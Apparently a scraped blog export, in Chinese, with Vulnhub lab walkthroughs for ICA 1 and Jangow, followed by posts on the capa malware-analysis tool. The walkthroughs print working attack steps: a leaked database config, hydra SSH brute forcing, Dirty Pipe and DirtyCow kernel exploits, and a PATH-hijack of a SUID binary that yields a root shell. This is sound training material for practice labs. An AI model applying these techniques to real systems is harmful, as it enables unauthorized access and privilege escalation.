[02:24:17] 301 - 313B - /core -\u003e http://172.16.86.143/core/ [02:24:17] 301 - 312B - /css -\u003e http://172.16.86.143/css/ [02:24:22] 200 - 894B - /favicon.ico [02:24:26] 301 - 315B - /images -\u003e http://172.16.86.143/images/ [02:24:26] 200 - 2KB - /images/ [02:24:26] 200 - 6KB - /index.php [02:24:27] 301 - 316B - /install -\u003e http://172.16.86.143/install/ [02:24:27] 200 - 2KB - /install/ [02:24:27] 200 - 2KB - /install/index.php?upgrade/ [02:24:28] 301 - 319B - /javascript -\u003e http://172.16.86.143/javascript/ [02:24:28] 200 - 2KB - /js/ [02:24:32] 200 - 676B - /manual/index.html [02:24:32] 301 - 315B - /manual -\u003e http://172.16.86.143/manual/ [02:24:44] 200 - 470B - /readme.txt [02:24:46] 200 - 26B - /robots.txt [02:24:47] 403 - 278B - /server-status [02:24:47] 403 - 278B - /server-status/ [02:24:54] 301 - 317B - /template -\u003e http://172.16.86.143/template/ [02:24:54] 200 - 2KB - /template/ [02:24:57] 200 - 1KB - /uploads/ [02:24:58] 301 - 316B - /uploads -\u003e http://172.16.86.143/uploads/ Task Completed 暂时没有发现什么关键信息泄露。 使用searchsploit测试一下是不是存在什么漏洞： 很幸运，有两个漏洞，比较关键的应该是第二个的密码泄露。 3. Exploit ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:3:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"1. Get username and password searchsploit -x php/webapps/50176.txt直接告诉我们如何利用该漏洞： 我们可以直接访问http://ipcore/config/databases.yml文件： ┌──(v4ler1an㉿kali)-[~] └─$ curl http://172.16.86.143/core/config/databases.yml all: doctrine: class: sfDoctrineDatabase param: dsn: 'mysql:dbname=qdpm;host=localhost' profiler: false username: qdpmadmin password: \"\u003c?php echo urlencode('UcVQCMQk2STVeS6J') ; ?\u003e\" attributes: quote_identifier: true 文件中泄露了一个username和passwod: qdpmadmin/UcVQCMQk2STVeS6J。该文件是mysql数据库的配置文件，所以我们可以使用该用户登录mysql数据库。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:4:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"2. Login Mysql 使用上面获取的用户名和密码登录mysql数据库： ┌──(v4ler1an㉿kali)-[~] └─$ mysql -u qdpmadmin -h 172.16.86.143 -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 58 Server version: 8.0.26 MySQL Community Server - GPL Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MySQL [(none)]\u003e show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | qdpm | | staff | | sys | +--------------------+ 6 rows in set (0.002 sec) MySQL [(none)]\u003e use staff; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [staff]\u003e show tables; +-----------------+ | Tables_in_staff | +-----------------+ | department | | login | | user | +-----------------+ 3 rows in set (0.002 sec) staff数据库可能会藏有很多用户信息，并且存在logiin和user表，查看表信息； MySQL [staff]\u003e select * from user; +------+---------------+--------+---------------------------+ | id | department_id | name | role | +------+---------------+--------+---------------------------+ | 1 | 1 | Smith | Cyber Security Specialist | | 2 | 2 | Lucas | Computer Engineer | | 3 | 1 | Travis | Intelligence Specialist | | 4 | 1 | Dexter | Cyber Security Analyst | | 5 | 2 | Meyer | Genetic Engineer | +------+---------------+--------+---------------------------+ 5 rows in set (0.001 sec) MySQL [staff]\u003e select * from login; +------+---------+--------------------------+ | id | user_id | password | +------+---------+--------------------------+ | 1 | 2 | c3VSSkFkR3dMcDhkeTNyRg== | | 2 | 4 | N1p3VjRxdGc0MmNtVVhHWA== | | 3 | 1 | WDdNUWtQM1cyOWZld0hkQw== | | 4 | 3 | REpjZVZ5OThXMjhZN3dMZw== | | 5 | 5 | Y3FObkJXQ0J5UzJEdUpTeQ== | +------+---------+--------------------------+ 5 rows in set (0.001 sec) 在user表中存在用户名，在login表中存在密码。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:5:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"3. Get more user info 上面可以获取数据库中的用户名和密码，我们可以尝试用hydra去爆破密码。将用户名和密码分别保存到user.txt和password.txt文件中： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ ls password.txt user.txt ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cat user.txt smith lucas travis dexter meyer ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ cat password.txt suRJAdGwLp8dy3rF 7ZwV4qtg42cmUXGX X7MQkP3W29fewHdC DJceVy98W28Y7wLg cqNnBWCByS2DuJSy 这里需要注意下password是base64解码之后的，user是全小写。然后跑hydra，服务是ssh，因为web的登录口是邮箱和密码登录，很明显不是用户名和密码，那么久只能测试ssh服务。 ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ hydra -L user.txt -P password.txt 172.16.86.143 ssh Hydra v9.5 (c) 2023 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-08 02:47:11 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:5/p:6), ~2 tries per task [DATA] attacking ssh://172.16.86.143:22/ [22][ssh] host: 172.16.86.143 login: dexter password: 7ZwV4qtg42cmUXGX [22][ssh] host: 172.16.86.143 login: travis password: DJceVy98W28Y7wLg 1 of 1 target successfully completed, 2 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-08 02:47:18 很幸运，爆出来两个用户名和密码：dexter/7ZwV4qtg42cmUXGX和travis/DJceVy98W28Y7wLg。 4. Privilege Escalation 使用上面获取的用户名和密码登录ssh，在travis用户目录下发现了user.txt： ┌──(v4ler1an㉿kali)-[~] └─$ ssh travis@172.16.86.143 travis@172.16.86.143's password: Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Nov 8 01:52:57 2023 from 172.16.86.138 travis@debian:~$ ls user.txt travis@debian:~$ cat user.txt ICA{Secret_Project} 查看用户权限： travis@debian:~$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for travis: Sorry, user travis may not run sudo on debian. 另外一个用户同样没有权限，所以需要想办法进行提权。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:6:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"1. Dirty_Pipe 第一种方式还是使用内核提权漏洞，检查内核版本和gcc版本： travis@debian:~$ uname -a Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux travis@debian:~$ gcc --version gcc (Debian 10.2.1-6) 10.2.1 20210110 Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Debian系统，内核版本为5.10，算是比较高的了。但是可以使用22年的dirty pipe进行提权。 vim编辑并gcc编译exp，然后运行： travis@debian:~$ ls dirty_pipe dirty_pipe.c user.txt travis@debian:~$ ./dirty_pipe Backing up /etc/passwd to /tmp/passwd.bak ... Setting root password to \"aaron\"... system() function call seems to have failed :( 提示我们失败了，但是需要注意的是，exp已经成功修改了root的password为aaron，所以我们直接su命令然后输入该密码即可进入root的shell： travis@debian:~$ su Password: # id uid=0(root) gid=0(root) groups=0(root) # ls -la /root total 40 drwx------ 3 root root 4096 Sep 25 2021 . drwxr-xr-x 18 root root 4096 Nov 8 01:34 .. -rw------- 1 root root 20 Sep 25 2021 .bash_history -rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc drwxr-xr-x 3 root root 4096 Sep 25 2021 .local -rw------- 1 root root 647 Sep 25 2021 .mysql_history -rw-r--r-- 1 root root 161 Jul 9 2019 .profile -rw-r--r-- 1 root root 217 Sep 25 2021 .wget-hsts -rw-r--r-- 1 root root 45 Sep 25 2021 root.txt -rw-r--r-- 1 root root 260 Sep 25 2021 system.info # cat /root/root.txt ICA{Next_Generation_Self_Renewable_Genetics} （比较可惜的是，这个shell没有自动补全，而且修改root用户密码也比较属于高危操作。） ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:7:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"2. SUID 第二种方式是通过SUID进行提权，因为在dexter用户目录下，存在一个note.txt给了提示信息： dexter@debian:~$ ls note.txt dexter@debian:~$ cat note.txt It seems to me that there is a weakness while accessing the system. As far as I know, the contents of executable files are partially viewable. I need to find out if there is a vulnerability or not. 这里说有个可执行文件可能会存在漏洞。 首先看下哪些程序具有SUID： dexter@debian:~$ find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; -rwsr-xr-x 1 root root 16816 Sep 25 2021 /opt/get_access -rwsr-xr-x 1 root root 58416 Feb 7 2020 /usr/bin/chfn -rwsr-xr-x 1 root root 35040 Jul 28 2021 /usr/bin/umount -rwsr-xr-x 1 root root 88304 Feb 7 2020 /usr/bin/gpasswd -rwsr-xr-x 1 root root 182600 Feb 27 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 63960 Feb 7 2020 /usr/bin/passwd -rwsr-xr-x 1 root root 44632 Feb 7 2020 /usr/bin/newgrp -rwsr-xr-x 1 root root 71912 Jul 28 2021 /usr/bin/su -rwsr-xr-x 1 root root 55528 Jul 28 2021 /usr/bin/mount -rwsr-xr-x 1 root root 52880 Feb 7 2020 /usr/bin/chsh -rwsr-xr-x 1 root root 481608 Mar 13 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 51336 Feb 21 2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 存在一个/opt/get_access程序： dexter@debian:~$ file /opt/get_access /opt/get_access: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74c7b8e5b3380d2b5f65d753cc2586736299f21a, for GNU/Linux 3.2.0, not stripped dexter@debian:~$ /opt/get_access ############################ ######## ICA ####### ### ACCESS TO THE SYSTEM ### ############################ Server Information: - Firewall: AIwall v9.5.2 - OS: Debian 11 \"bullseye\" - Network: Local Secure Network 2 (LSN2) v 2.4.1 All services are disabled. Accessing to the system is allowed only within working hours. 根据程序结果应该是药看这个程序了，首先看下它包含的字符串： 大部分都没有问题，但是这个cat /root/system.info感觉是直接执行系统命令，加上这个程序是一个root权限，那么这条命令也就是个root权限的命令。 如果想确认一下这个程序的逻辑，可以sftp把文件拿下来反编译看下： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sftp dexter@172.16.86.143 dexter@172.16.86.143's password: Connected to 172.16.86.143. sftp\u003e get /opt/get_access . Fetching /opt/get_access to ./get_access 利用思路： 替换cat，因为并没有指定cat的绝对路径，system()函数在调用时是从环境变量里读取，所以我们可以伪造一个cat文件，然后加上环境变量就可以实现提权。 cat文件内容为/bin/bash，修改环境变量： dexter@debian:~$ echo \"/bin/bash\" \u003e /tmp/cat dexter@debian:~$ cat /tmp/cat /bin/bash dexter@debian:~$ chmod +x /tmp/cat dexter@debian:~$ echo $PATH /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games dexter@debian:~$ export PATH=/tmp:$PATH dexter@debian:~$ echo $PATH /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games 把包含伪造的cat文件的/tmp路径放在了PATH环境变量的最前面，这样在执行到system(\"cat /root/system.info\")的时候，就会先去/tmp目录下调用cat。 直接执行/opt/get_access即可获得root的shell： dexter@debian:~$ /opt/get_access root@debian:~# id uid=0(root) gid=0(root) groups=0(root),1001(dexter) root@debian:~# ls note.txt root@debian:~# cat /root/root.txt root@debian:~# more /root/root.txt ICA{Next_Generation_Self_Renewable_Genetics} root@debian:~# /bin/cat /root/root.txt ICA{Next_Generation_Self_Renewable_Genetics} Notes SUID的利用方式中，替换掉cat之后，cat命令就使用不了，除非使用绝对路径。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_ica/:8:0","tags":["Vulnhub"],"title":"Vulnhub ICA 1","uri":"/2023/11/vulnhub_ica/"},{"categories":["Web"],"content":"Vulnhub靶场记录--Jangow:1.0.1","date":"2023-11-07","objectID":"/2023/11/vulnhub_jangow/","tags":["Vulnhub"],"title":"Vulnhub Jangow 1.0.1","uri":"/2023/11/vulnhub_jangow/"},{"categories":["Web"],"content":"Vulnhub靶场练习 – jangow:1.0.1 Knowledge Scan(ip, port, web directory) Command Injection Vulnerability Privilege Escalation(DirtyCow) 1. Environment Setup 下载文件是ova格式，直接vmware运行即可。vulnhub的环境官方推荐使用virtualbox，但是用的vmware暂时还没有发现什么问题。 如果出现配置了NAT但是靶机还是无法获取到IP的情况，参考here。 2. Reconnaissance ","date":"2023-11-07","objectID":"/2023/11/vulnhub_jangow/:0:0","tags":["Vulnhub"],"title":"Vulnhub Jangow 1.0.1","uri":"/2023/11/vulnhub_jangow/"},{"categories":["Web"],"content":"1. IP address 直接使用arp-scan扫描一下靶机ip地址： ","date":"2023-11-07","objectID":"/2023/11/vulnhub_jangow/:1:0","tags":["Vulnhub"],"title":"Vulnhub Jangow 1.0.1","uri":"/2023/11/vulnhub_jangow/"},{"categories":["Web"],"content":"2. Port Infomation 拿到ip后，查看靶机端口情况： ┌──(v4ler1an㉿kali)-[~/tools/scan] └─$ sudo nmap -T4 -Pn -A 192.168.47.136 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 10:07 CST Nmap scan report for 192.168.47.136 (192.168.47.136) Host is up (0.00058s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Index of / | http-ls: Volume / | SIZE TIME FILENAME | - 2021-06-10 18:05 site/ |_ MAC Address: 00:0C:29:0F:07:54 (VMware) Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.9 (97%), Linux 4.4 (97%), Linux 3.13 (94%), Linux 4.2 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Linux 2.6.32 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: Host: 127.0.0.1; OS: Unix TRACEROUTE HOP RTT ADDRESS 1 0.58 ms 192.168.47.136 (192.168.47.136) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.06 seconds （因为是刚开始玩，所以可能有些命令使用的是最简单的形式，不会加各种各样的参数，主要是模拟一个逐步递进的过程。） 这里可以看到靶机开放了ftp服务，端口21；http web服务，端口80。ftp登录需要账号密码，此时我们没有账号密码，那么主要的目标就要放在http web服务上了。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_jangow/:2:0","tags":["Vulnhub"],"title":"Vulnhub Jangow 1.0.1","uri":"/2023/11/vulnhub_jangow/"},{"categories":["Web"],"content":"3. Web Directory 访问http://192.168.7.136:80，页面如下： site页面： about和projects都是静态页面，但是在Buscar页面则存在php处理文件： ","date":"2023-11-07","objectID":"/2023/11/vulnhub_jangow/:3:0","tags":["Vulnhub"],"title":"Vulnhub Jangow 1.0.1","uri":"/2023/11/vulnhub_jangow/"},{"categories":["Web"],"content":"Command Injection Vulnerability 参数buscar后存在=符号，尝试在这里赋值： 这里存在命令注入漏洞，可以通过buscar参数直接传递系统命令。我们此时就可以尝试用过该漏洞去获取系统用户名和密码： 可以直接获取bash的有root和jangow01用户，那么接下来就是尝试去找这两个用户的密码。 然后扫一下web目录，看看都有哪些东西： ┌──(v4ler1an㉿kali)-[~/tools/scan] └─$ dirsearch -u http://192.168.47.136 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927 Output File: /home/v4ler1an/.dirsearch/reports/192.168.47.136/_23-11-08_10-11-03.txt Error Log: /home/v4ler1an/.dirsearch/logs/errors-23-11-08_10-11-03.log Target: http://192.168.47.136/ [10:11:03] Starting: [10:11:03] 200 - 336B - /.backup [10:11:04] 403 - 279B - /.ht_wsr.txt [10:11:04] 403 - 279B - /.htaccess.bak1 [10:11:04] 403 - 279B - /.htaccess.save [10:11:04] 403 - 279B - /.htaccess.orig [10:11:04] 403 - 279B - /.htaccess.sample [10:11:04] 403 - 279B - /.htaccess_extra [10:11:04] 403 - 279B - /.htaccess_sc [10:11:04] 403 - 279B - /.htaccess_orig [10:11:04] 403 - 279B - /.htaccessBAK [10:11:04] 403 - 279B - /.htaccessOLD2 [10:11:04] 403 - 279B - /.htaccessOLD [10:11:04] 403 - 279B - /.htm [10:11:04] 403 - 279B - /.html [10:11:04] 403 - 279B - /.httr-oauth [10:11:04] 403 - 279B - /.htpasswd_test [10:11:04] 403 - 279B - /.htpasswds [10:11:04] 403 - 279B - /.php [10:11:04] 403 - 279B - /.php3 [10:11:27] 403 - 279B - /server-status [10:11:27] 403 - 279B - /server-status/ [10:11:28] 301 - 315B - /site -\u003e http://192.168.47.136/site/ [10:11:28] 200 - 10KB - /site/ Task Completed web服务的主目录为site，同级还存在很多其他的文件，我们使用前面的命令注入漏洞访问一下各种文件，可以在.backup文件中发现关键信息： $servername = \"localhost\"; $database = \"jangow01\"; $username = \"jangow01\"; $password = \"abygurl69\"; // Create connection $conn = mysqli_connect($servername, $username, $password, $database); // Check connection if (!$conn) { die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected successfully\"; mysqli_close($conn); 该文件应该是用来连接数据库的，但是泄露了jangow01的用户名和密码。 3. Initial Access 使用jangow01的用户名和密码登录ftp，在/home/jangow01目录下发现了user.txt文件： ftp\u003e ls 229 Entering Extended Passive Mode (|||5764|) 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 33 Jun 10 2021 user.txt 226 Directory send OK. ftp\u003e get user.txt local: user.txt remote: user.txt 229 Entering Extended Passive Mode (|||5771|) 150 Opening BINARY mode data connection for user.txt (33 bytes). 100% |**************************************************************************************************************| 33 92.60 KiB/s 00:00 ETA 226 Transfer complete. 33 bytes received in 00:00 (46.97 KiB/s) 文件内容如下： d41d8cd98f00b204e9800998ecf8427e 4. Privilege Escalation 我们通过jangow01/abygurl69可以登录靶机系统，但是没有root权限，无法查看root目录下的文件，接下来就是想办法去提权。 登录到靶机上，查看系统版本： 使用的ubuntu 16.04，内核版本为4.4，低版本Linux操作系统，而且存在gcc。 用DirtyCow去提权： ftp\u003e put dirtycow-mem.c local: dirtycow-mem.c remote: dirtycow-mem.c 229 Entering Extended Passive Mode (|||39860|) 150 Ok to send data. 100% |**************************************************************************************************************| 5120 119.09 MiB/s 00:00 ETA 226 Transfer complete. 5120 bytes sent in 00:00 (9.16 MiB/s) ftp\u003e ls 229 Entering Extended Passive Mode (|||10466|) 150 Here comes the directory listing. -rw------- 1 1000 1000 5120 Nov 08 08:40 dirtycow-mem.c -rw-rw-r-- 1 1000 1000 33 Jun 10 2021 user.txt 226 Directory send OK. 然后在靶机bash中编译一下： gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread 运行，拿到root权限： 并在root目录下发现proof.txt： 备注 实测dirtycow-mem不是很稳定，提权后存在导致系统崩溃的情况。 Notes 靶机无法直接在命令行中直接使用’/‘符号，这里可以使用自动补全路径的方式来获取’/‘符号。 ","date":"2023-11-07","objectID":"/2023/11/vulnhub_jangow/:3:1","tags":["Vulnhub"],"title":"Vulnhub Jangow 1.0.1","uri":"/2023/11/vulnhub_jangow/"},{"categories":["ThreatHunting"],"content":"记录一下capa这款工具的一些内容。","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"使用几篇文章来详细介绍一下capa这款工具的原理、使用和在现实生产环境中的利用。 capa thins 02 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:0:0","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"capa 基本使用 capa 的 help 信息如下： (base) PS C:\\Users\\v4le1an\\Desktop\\tmp\u003e .\\capa.exe --help usage: capa.exe [-h] [--version] [-v] [-vv] [-d] [-q] [--color {auto,always,never}] [-f {auto,pe,dotnet,elf,sc32,sc64,freeze}] [-b {vivisect,binja,pefile}] [--os {auto,linux,macos,windows}] [-r RULES] [-s SIGNATURES] [-t TAG] [-j] sample The FLARE team's open-source tool to identify capabilities in executable files. positional arguments: sample path to sample to analyze optional arguments: -h, --help show this help message and exit --version show program's version number and exit -v, --verbose enable verbose result document (no effect with --json) -vv, --vverbose enable very verbose result document (no effect with --json) -d, --debug enable debugging output on STDERR -q, --quiet disable all output but errors --color {auto,always,never} enable ANSI color codes in results, default: only during interactive session -f {auto,pe,dotnet,elf,sc32,sc64,freeze}, --format {auto,pe,dotnet,elf,sc32,sc64,freeze} select sample format, auto: (default) detect file type automatically, pe: Windows PE file, dotnet: .NET PE file, elf: Executable and Linkable Format, sc32: 32-bit shellcode, sc64: 64-bit shellcode, freeze: features previously frozen by capa -b {vivisect,binja,pefile}, --backend {vivisect,binja,pefile} select the backend to use --os {auto,linux,macos,windows} select sample OS: auto (detect OS automatically - default), linux, macos, windows -r RULES, --rules RULES path to rule file or directory, use embedded rules by default -s SIGNATURES, --signatures SIGNATURES path to .sig/.pat file or directory used to identify library functions, use embedded signatures by default -t TAG, --tag TAG filter on rule meta field values -j, --json emit JSON instead of text By default, capa uses a default set of embedded rules. You can see the rule set here: https://github.com/mandiant/capa-rules To provide your own rule set, use the `-r` flag: capa --rules /path/to/rules suspicious.exe capa -r /path/to/rules suspicious.exe examples: identify capabilities in a binary capa suspicious.exe identify capabilities in 32-bit shellcode, see `-f` for all supported formats capa -f sc32 shellcode.bin report match locations capa -v suspicious.exe report all feature match details capa -vv suspicious.exe filter rules by meta fields, e.g. rule name or namespace capa -t \"create TCP socket\" suspicious.exe 对其中几个比较重要的参数做个啰嗦的解释： -v/vv: 输出详细的分析结果，这里的详细会包每个 rule 命中的上下文和具体的数据。 -f: 设置待分析文件的格式，默认情况下是自动检测。 -r: 指定使用的规则，默认使用内嵌的 capa-rules ，但是因为 capa 支持自定义规则，所以可以在这里指定使用的自定义规则。 -j: 输出 json 格式。这里需要注意的是 -v/vv和-j参数同时用的时候，-v/vv 不生效，因为 json 输出的信息已经很全了。 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:1:0","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"capa 结果分析 下面使用一个简单的例子快速过一遍 capa 的分析结果。 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:2:0","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"默认输出 (base) PS C:\\Users\\v4le1an\\Desktop\\tmp\u003e .\\capa.exe .\\2b555547ea2cae583ba9c38a3891f316fc787f5f5048c94787bee2d16983e8cc 上面的命令不加任何参数，输出如下： 我们拆解一下各部分输出。 第一部分 这里包含一些文件的基本属性信息，文件hash、运行的os、架构还有文件的完整路径。 第二部分 第二部分包含的主要是 ATT\u0026CK 的各项 TTP ，有具体的分类、描述和 ID，这对于我们梳理样本的 TTP 信息十分有用。而且，VT 也使用了 capa 的 ATT\u0026CK 解析的结果。 但是经过测试发现，VT 的解析结果和使用 capa 在本地的测试结果存在不一致，猜测是使用了不同的 ATT\u0026CK 版本。 第三部分 第三部分的内容主要是 Malware Behavior Catalog 的内容，该标准类似于 ATT\u0026CK 框架，对程序的动态行为特征进行了分类整理，来描述样本的执行情况，可以看作是 ATT\u0026CK 的一种补充。 第四部分 最后一部分则是描述样本的一些 capability ，并且会统计显示出不同数量的匹配。 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:2:1","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"v/vv的详细输出 在使用 -v 参数的情况下的输出： 会给出匹配到的具体的项目，例如function或者basic block，同时，会给出匹配到的具体的code address。 如果是使用 -vv ，则会给出更为详细的信息： 可以看到，会给出具体的att\u0026ck的描述、id等等，还会给出嗲用的api的名字、地址等等。 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:2:2","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"json格式输出 json格式的输出信息完整度和使用 -vv 参数一致，但是会以json格式输出，默认输出到 STDOUT，如果想保存到文件，则需要重定向到文件。输出的json文件结构如下： 使用json格式的结果输出，我们可以对其进行更多的操作，比如批量提取字段等。 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:2:3","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"IDA Pro capa插件使用 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:3:0","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"安装 在capa的git下载下来最新的code，需要注意其中会包含capa-rules和capa-test子项目，前者是capa的分析规则，后者是capa搜集的测试用例。如果不需要测试用例，可以单独下载capa和capa-rules即可。 git clone --recurse-submodules https://github.com/mandiant/capa.git 下载下来之后，使用pip3 install -e [path_to_capa]进行安装即可，这里的pip3需要是IDA使用的那个pip3。 ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:3:1","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"使用 安装完成之后，在python的scripts目录下会多一个capa.exe： 此时就可以在IDA中使用了。 如果安装顺利，安装完成后，在IDA的Plugins下就会看到该插件了： 也可以直接Alt + F5快捷键打开插件。 默认情况下，IDA分析完程序capa是不自动进行解析的，而且可以设置是否加载缓存的分析结果： 第一次打开插件窗口，需要指定rules目录，可以是官方的rules，也可以是自己开发的rules，指定完之后，capa开始根据rules进行程序分析，分析结果如下： 在对应的匹配项上悬停鼠标，会显示出对应的rule。 此外，双击address，IDA会自动跳转到恶意代码相应的位置，并且会高亮显示选中的规则对应的代码： ","date":"2023-09-10","objectID":"/2023/09/capa_thins_02/:3:2","tags":["ThreatHunting"],"title":"capa things 02","uri":"/2023/09/capa_thins_02/"},{"categories":["ThreatHunting"],"content":"记录一下capa这款工具的一些内容。","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"使用几篇文章来详细介绍一下capa这款工具的原理、使用和在现实生产环境中的利用。 Capa Things ","date":"2023-09-02","objectID":"/2023/09/capa_thins_01/:0:0","tags":["ThreatHunting"],"title":"capa things 01","uri":"/2023/09/capa_thins_01/"},{"categories":["ThreatHunting"],"content":"1. Basic Knowledge Capa是FilreEye(Mandiant)公司开源的静态分析工具，旨在检测和识别恶意软件的高级静态行为，同时支持IDA插件操作和安装服务及HTTP通信，方便安全人员快速定位恶意代码，且能与ATT\u0026CK框架和MBC进行映射。 通常能分析的样本格式： PE文件 ELF文件 .NET模块 ShellCode文件 source code地址： capa工具地址 工具的运行结果如下所示，它能有效反映恶意软件在ATT\u0026CK框架中的技战术特点： (base) PS C:\\Users\\v4le1an\\Desktop\\tmp\u003e .\\capa.exe .\\2b555547ea2cae583ba9c38a3891f316fc787f5f5048c94787bee2d16983e8cc ┍━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑ │ md5 │ 59059b2be273f57b45adc085ab631617 │ │ sha1 │ b78669cd7f0bb201b02878c68b309f0c40d85f6f │ │ sha256 │ 2b555547ea2cae583ba9c38a3891f316fc787f5f5048c94787bee2d16983e8cc │ │ os │ windows │ │ format │ pe │ │ arch │ i386 │ │ path │ C:/Users/v4le1an/Desktop/tmp/2b555547ea2cae583ba9c38a3891f316fc787f5f5048c94787bee2d16983e8cc │ ┕━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙ 